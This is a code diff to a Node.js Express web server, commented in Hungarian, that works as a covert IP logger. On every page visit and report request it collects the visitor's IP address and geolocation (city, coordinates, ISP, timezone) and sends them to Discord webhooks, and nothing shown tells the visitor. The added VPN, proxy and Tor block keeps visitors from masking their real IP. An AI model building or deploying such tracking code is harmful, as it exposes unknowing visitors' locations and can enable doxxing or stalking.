@@ -10,7 +10,40 @@ const PORT = process.env.PORT || 3000;
 const MAIN_WEBHOOK = process.env.MAIN_WEBHOOK;
 const ALERT_WEBHOOK = process.env.ALERT_WEBHOOK;
 
-app.use(express.static('public'));
+// ---- Magyarosított formázó minden fontos adattal ----
+function formatGeoDataMagyar(geo) {
+  if (!geo || Object.keys(geo).length === 0) return '**Ismeretlen adatok**';
+  return (
+    `**IP-cím:** ${geo.ip || 'Ismeretlen'}\n` +
+    `**Sikeres lekérdezés:** ${geo.success || 'Ismeretlen'}\n` +
+    `**Típus:** ${geo.type || 'Ismeretlen'}\n` +
+    `**Kontinens:** ${geo.continent || 'Ismeretlen'}\n` +
+    `**Kontinens kód:** ${geo.continent_code || 'Ismeretlen'}\n` +
+    `**Ország:** ${geo.country || 'Ismeretlen'}\n` +
+    `**Országkód:** ${geo.country_code || 'Ismeretlen'}\n` +
+    `**Ország zászló:** ${geo.country_flag || 'Ismeretlen'}\n` +
+    `**Főváros:** ${geo.country_capital || 'Ismeretlen'}\n` +
+    `**Ország hívószám:** ${geo.country_phone || 'Ismeretlen'}\n` +
+    `**Szomszédos országok:** ${geo.country_neighbours || 'Ismeretlen'}\n` +
+    `**Régió:** ${geo.region || 'Ismeretlen'}\n` +
+    `**Város:** ${geo.city || 'Ismeretlen'}\n` +
+    `**Szélesség:** ${geo.latitude || 'Ismeretlen'}\n` +
+    `**Hosszúság:** ${geo.longitude || 'Ismeretlen'}\n` +
+    `**ASN:** ${geo.asn || 'Ismeretlen'}\n` +
+    `**Szervezet:** ${geo.org || 'Ismeretlen'}\n` +
+    `**Hálózat:** ${geo.isp || 'Ismeretlen'}\n` +
+    `**Időzóna:** ${geo.timezone || 'Ismeretlen'}\n` +
+    `**Időzóna neve:** ${geo.timezone_name || 'Ismeretlen'}\n` +
+    `**Időzóna nyári idő eltolás:** ${geo.timezone_dstOffset || 'Ismeretlen'}\n` +
+    `**Időzóna GMT eltolás:** ${geo.timezone_gmtOffset || 'Ismeretlen'}\n` +
+    `**Időzóna GMT:** ${geo.timezone_gmt || 'Ismeretlen'}\n` +
+    `**Valuta:** ${geo.currency || 'Ismeretlen'}\n` +
+    `**Valuta kód:** ${geo.currency_code || 'Ismeretlen'}\n` +
+    `**Valuta szimbólum:** ${geo.currency_symbol || 'Ismeretlen'}\n` +
+    `**Valuta árfolyam:** ${geo.currency_rates || 'Ismeretlen'}\n` +
+    `**Valuta többes:** ${geo.currency_plural || 'Ismeretlen'}\n`
+  );
+}
 
 // ---- IP lekérés minden lehetőséggel ----
 function getClientIp(req) {
@@ -40,21 +73,15 @@ async function getGeo(ip) {
   }
 }
 
-// ---- MINDEN mező kiírása egy formázóval ----
-function formatGeoData(geoData) {
-  if (!geoData || Object.keys(geoData).length === 0) return '**Nem elérhetőek adatok az IP-ről**';
-
-  let out = '';
-  for (const [key, value] of Object.entries(geoData)) {
-    out += `**${key}:** ${value}\n`;
-  }
-  return out;
-}
-
 // --- Főoldal (/) ---
 app.get('/', async (req, res) => {
   const ip = getClientIp(req);
   const geoData = await getGeo(ip);
+
+  // --- VPN/Proxy/TOR blokkolás ---
+  if (geoData.proxy || geoData.vpn || geoData.tor) {
+    return res.status(403).send('VPN/proxy vagy TOR használata tiltott ezen az oldalon! 🚫');
+  }
 
   axios.post(MAIN_WEBHOOK, {
     username: "Helyszíni Naplózó <3",
@@ -64,8 +91,7 @@ app.get('/', async (req, res) => {
       title: 'Új látogató az oldalon!',
       description:
         `**Oldal:** /\n` +
-        `**IP-cím:** ${ip}\n\n` +
-        formatGeoData(geoData),
+        formatGeoDataMagyar(geoData),
       color: 0x800080
     }]
   }).catch(()=>{});
@@ -83,6 +109,11 @@ app.get('/:page', async (req, res, next) => {
     const ip = getClientIp(req);
     const geoData = await getGeo(ip);
 
+    // --- VPN/Proxy/TOR blokkolás ---
+    if (geoData.proxy || geoData.vpn || geoData.tor) {
+      return res.status(403).send('VPN/proxy vagy TOR használata tiltott ezen az oldalon! 🚫');
+    }
+
     axios.post(MAIN_WEBHOOK, {
       username: "Helyszíni Naplózó <3",
       avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
@@ -91,8 +122,7 @@ app.get('/:page', async (req, res, next) => {
         title: 'Új látogató az oldalon!',
         description:
           `**Oldal:** /${pageName}\n` +
-          `**IP-cím:** ${ip}\n\n` +
-          formatGeoData(geoData),
+          formatGeoDataMagyar(geoData),
         color: 0x800080
       }]
     }).catch(()=>{});
@@ -109,6 +139,11 @@ app.post('/report', express.json(), async (req, res) => {
   const { reason, page } = req.body;
   const geoData = await getGeo(ip);
 
+  // --- VPN/Proxy/TOR blokkolás gyanús tevékenységnél is ---
+  if (geoData.proxy || geoData.vpn || geoData.tor) {
+    return res.status(403).send('VPN/proxy vagy TOR használata tiltott!');
+  }
+
   axios.post(ALERT_WEBHOOK, {
     username: "Helyszíni Naplózó <3",
     avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
@@ -118,14 +153,16 @@ app.post('/report', express.json(), async (req, res) => {
       description:
         `**Oldal:** ${page || 'Ismeretlen'}\n` +
         `**Művelet:** ${reason}\n` +
-        `**IP-cím:** ${ip}\n\n` +
-        formatGeoData(geoData),
+        formatGeoDataMagyar(geoData),
       color: 0x800080
     }]
   }).catch(()=>{});
 
   res.json({ ok: true });
 });
+
+// --- Statikus fájlok kiszolgálása (pl. képek, CSS, JS) ---
+app.use(express.static('public'));
 
 // --- 404 minden másra ---
 app.use((req, res) => {
